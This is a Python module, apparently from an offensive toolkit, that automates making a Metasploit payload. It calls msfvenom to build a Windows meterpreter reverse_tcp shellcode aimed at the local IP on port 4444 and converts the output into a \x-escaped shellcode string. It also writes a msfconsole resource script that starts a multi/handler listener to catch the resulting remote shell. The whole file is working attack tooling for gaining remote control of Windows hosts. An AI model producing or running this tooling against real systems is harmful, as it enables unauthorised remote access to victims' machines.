import os
import socket
import time
import random
from module import Moduleobject
import binascii
import re

class msf_origin_raw(Moduleobject):
    def __init__(self,ui):
        super(msf_origin_raw,self).__init__()
        self.ui=ui
        ui.banner()
        self.values={'IP':'%s'%self.get_lan_ip(),
                     'Port':'4444',
                     'payload':'reverse_tcp',
                     'tempfile':'%s'%(time.strftime('%m%Y')+'.tmp')
                     }
        if os.path.isfile('./tmp/'+self.values['tempfile']):
            self.values['tempfile'] = self.values['tempfile'] + '_' + str(random.randint(1000,9999))
        self.outraw='./tmp/msf_common_raw_%s_%s'%(time.strftime('%m%Y'),str(random.randint(0,100)))
        self.msfrc ='./tmp/msf_rc_%s_%s'%(time.strftime('%m%Y'),str(random.randint(0,100)))

    def get_lan_ip(self):
        soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        soc.connect(("8.8.8.8", 80))
        local_IP = soc.getsockname()[0]
        soc.close()
        return local_IP

    def decode_shellcode(self,file_path):
        with open(file_path, 'rb') as raw:
            shellcodec = binascii.hexlify(raw.read())
            shellcode_hex_string = shellcodec.decode()
            for char in re.findall("..", shellcode_hex_string):
                with open('./tmp/' + self.values['tempfile'], 'a') as temp:
                    temp.write("\\x" + char)
            else:
                print('\033[92m' + '[*]' + '\033[0m''------> shellcode readed <------')



    def generate_rc(self):
        with open (self.msfrc,'w') as console:
            console.write('\n'.join(['use exploit/multi/handler',
                                     'set PAYLOAD windows/meterpreter/%s' %self.values['payload'],
                                     'set LHOST %s' %self.values['IP'],
                                     'set LPORT %s' %self.values['Port'],
                                     'exploit -j -z',]))
            print('\033[92m' + '[*]' + '\033[0m' + '------> msfconsole_rc created <------')
            time.sleep(2)

    def run_action(self):
        os.system('msfvenom -p windows/meterpreter/%s LHOST=%s LPORT=%s -f raw > %s'
                  %(self.values['payload'],
                    self.values['IP'],
                    self.values['Port'],
                    self.outraw),)
        print('\033[92m'+'[*]'+'\033[0m'+'------> msfpayload created <------')
        time.sleep(2)
        self.decode_shellcode(self.outraw)
        time.sleep(2)
        self.generate_rc()
        input(" Type any key to Continue!!! ")

if __name__ =='__main__':
    pass